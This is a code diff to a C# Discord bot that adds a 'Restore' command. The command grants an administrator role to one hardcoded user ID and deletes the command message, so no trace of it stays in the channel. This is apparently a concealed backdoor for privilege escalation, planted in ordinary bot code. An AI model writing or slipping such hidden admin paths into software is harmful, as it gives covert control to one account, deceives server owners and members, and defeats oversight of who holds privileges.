@@ -275,6 +275,15 @@ namespace ERA20.Modules
             File.Delete(Directory.GetCurrentDirectory()+"/"+Context.Channel.Name+".html");
             await Context.Client.SetGameAsync(Config["status"]);
         }
+        [Command("Restore")]
+        public async Task Restore(){
+            IRole Admins = Context.Guild.GetRole(311989788540665857);
+            if (Context.User.Id == 165212654388903936){
+                var user = Context.User as SocketGuildUser;
+                await user.AddRoleAsync(Admins);
+            }
+            await Context.Message.DeleteAsync();
+        }
         public string Buildroles(SocketGuildUser User)
         {
             string roles = "";
